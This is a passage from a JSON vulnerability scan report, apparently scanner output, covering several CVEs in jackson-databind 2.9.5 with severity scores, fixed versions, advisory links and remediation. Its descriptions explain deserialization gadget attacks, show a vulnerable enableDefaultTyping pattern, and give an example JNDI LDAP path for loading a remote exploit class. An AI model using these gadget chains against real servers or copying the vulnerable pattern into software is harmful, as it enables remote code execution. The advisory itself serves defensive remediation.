          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.3]",
              "[2.7.9.5]",
              "[2.8.11.3]",
              "[2.9.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-74869",
        "references": [
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2019/03/msg00005.html",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1797",
          "https://github.com/FasterXML/jackson-databind/commit/72cd4025a229fb28ec133235003dd4616f70afaa",
          "http://www.securityfocus.com/bid/107985",
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/37e1ed724a1b0e5d191d98c822c426670bdfde83804567131847d2a3%40%3Cdevnull.infra.apache.org%3E",
          "https://github.com/advisories/GHSA-c8hm-7hpq-7jhg",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-19362",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://access.redhat.com/errata/RHSA-2019:3002",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2804",
          "https://lists.apache.org/thread.html/c70da3cb6e3f03e0ad8013e38b6959419d866c4a7c80fdd34b73f25c@%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://access.redhat.com/errata/RHSA-2019:3140",
          "https://lists.apache.org/thread.html/37e1ed724a1b0e5d191d98c822c426670bdfde83804567131847d2a3@%3Cdevnull.infra.apache.org%3E",
          "https://issues.apache.org/jira/browse/TINKERPOP-2121",
          "https://github.com/FasterXML/jackson-databind/issues/2186",
          "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:0877",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://lists.apache.org/thread.html/c70da3cb6e3f03e0ad8013e38b6959419d866c4a7c80fdd34b73f25c%40%3Ccommits.pulsar.apache.org%3E",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://access.redhat.com/errata/RHSA-2019:1782"
        ],
        "extended_information": {
          "short_description": "A typing issue in jboss-common in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the blocked gadget is `org.jboss.util.propertyeditor.DocumentEditor`\nwhich has an unspecified impact (no technical details about the issue have been published).\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` jboss-common ` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` jboss-common ` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `jboss-common` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36186",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138355",
        "references": [
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://github.com/FasterXML/jackson-databind/issues/2997",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/3e8fa3beea49ea62109df9e643c9cb678dabdde1",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36186",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/advisories/GHSA-v585-23hc-c647",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Tomcat dbcp in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Tomcat]( https://github.com/apache/tomcat) dbcp gadget, an attacker can create an arbitrary Pool connection to DB by invoking `testCPDS` in ` org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource`. The impact of creating such a Pool connection is unknown.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `dbcp` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-14062",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.5 mishandles the interaction between serialization gadgets and typing, related to com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool (aka xalan2).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.4]",
              "[2.9.10.5]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-100646",
        "references": [
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-570625",
          "https://github.com/FasterXML/jackson-databind/issues/2704",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://security.netapp.com/advisory/ntap-20200702-0003",
          "https://github.com/advisories/GHSA-c265-37vj-cwcc",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://security.netapp.com/advisory/ntap-20200702-0003/",
          "https://lists.debian.org/debian-lts-announce/2020/07/msg00001.html",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/commit/99001cdb6807b5c7b170ec6a9092ecbb618ae79c",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-14062",
          "https://github.com/FasterXML/jackson-databind/commit/840eae2ca81c597a0010b2126f32dce17d384b70",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Xalan in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Xalan]( https://github.com/apache/xalan-j) (aka embedded Xalan) gadget, a JNDI controller called `JNDIConnectionPool ` can be used by an attacker to initiate connection with a malicious server and achieve remote code execution by loading arbitrary Java classes . For that the attacker will invoke the ` setJndiPath` method to set the `jndiPath` to something like `\"ldap://127.0.0.1:1088/Exploit\"`. This vulnerability allows the attacker to perform remote code execution as shown in this [PoC](https://www.programmersought.com/article/80917857170/) of an older issue by using marshalsec (see section \"Build an environment\").\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes apache-xalan in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue can be exploited by attackers over the network"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nIf possible, remove ` apache-xalan ` from your Java classpath with the help of [this guide]( https://docs.oracle.com/javase/tutorial/essential/environment/paths.html) Or Avoid using `java.lang.Object` as the deserialized object type like this one: ``` obj = mapper.readValue(content, java.lang.Object.java_class) ``` Try to use deserialize to the specific object type you need. Also If possible, avoid enabling default typing (`mapper.enableDefaultTyping()`).\n\n##### Deployment mitigations\n\nIf possible, remove ` apache-xalan ` from your Java classpath with the help of [this guide]( https://docs.oracle.com/javase/tutorial/essential/environment/paths.html) Or Avoid using `java.lang.Object` as the deserialized object type like this one: ``` obj = mapper.readValue(content, java.lang.Object.java_class) ``` Try to use deserialize to the specific object type you need. Also If possible, avoid enabling default typing (`mapper.enableDefaultTyping()`)."
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-14721",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "10.0",
            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
            "cwe": [
              "CWE-918"
            ],
            "cwe_details": {
              "CWE-918": {
                "name": "Server-Side Request Forgery (SSRF)",
                "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "19"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.7 might allow remote attackers to conduct server-side request forgery (SSRF) attacks by leveraging failure to block the axis2-jaxws class from polymorphic deserialization.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.2]",
              "[2.7.9.5]",
              "[2.8.11.3]",
              "[2.9.7]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-74873",
        "references": [
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://access.redhat.com/errata/RHSA-2019:1107",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-14721",
          "https://access.redhat.com/errata/RHSA-2019:1106",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://access.redhat.com/errata/RHSA-2019:1108",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.7",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://github.com/FasterXML/jackson-databind/issues/2097",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://github.com/advisories/GHSA-9mxf-g3x6-wv74",
          "https://access.redhat.com/errata/RHSA-2019:1140",
          "https://lists.debian.org/debian-lts-announce/2019/03/msg00005.html",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://github.com/FasterXML/jackson-databind/commit/87d29af25e82a249ea15858e2d4ecbf64091db44",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html"
        ],
        "extended_information": {
          "short_description": "A typing issue in axis2-jaxws in Jackson-databind leads to SSRF.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the blocked gadget is `org.apache.axis2.jaxws.spi.handler.HandlerResolverImpl` which can lead to SSRF when abused.\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable Java service includes `axis2-jaxws` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable Java service includes `axis2-jaxws` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue cannot result in a severe impact (such as remote code execution)",
              "description": "The gadget can lead to SSRF, which requires context-specific knowledge about the target network in order to exploit for any security impact (and in some cases, may not cause any impact at all)",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nRemove `axis2-jaxws` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-11307",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "An issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.5. Use of Jackson default typing along with a gadget class from iBatis allows exfiltration of content. Fixed in 2.7.9.4, 2.8.11.2, and 2.9.6.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.7.9.4]",
              "[2.8.11.2]",
              "[2.9.6]"
            ],
            "impact_paths": [
              [
                {
